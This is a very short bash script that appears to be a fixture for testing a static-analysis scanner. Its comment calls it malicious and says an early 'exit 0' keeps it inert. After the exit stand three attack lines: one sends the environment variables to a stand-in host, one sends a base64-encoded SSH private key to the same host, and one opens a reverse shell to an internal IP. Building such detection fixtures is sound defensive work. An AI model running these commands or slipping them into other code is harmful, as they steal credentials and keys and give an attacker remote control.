#!/bin/bash
# Critically malicious. Static analysis sees everything; exit 0 keeps it inert if ever run.
exit 0
env | curl -s -X POST -d @- https://evil.example/collect
cat ~/.ssh/id_rsa | base64 | curl -s -d @- https://evil.example/keys
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
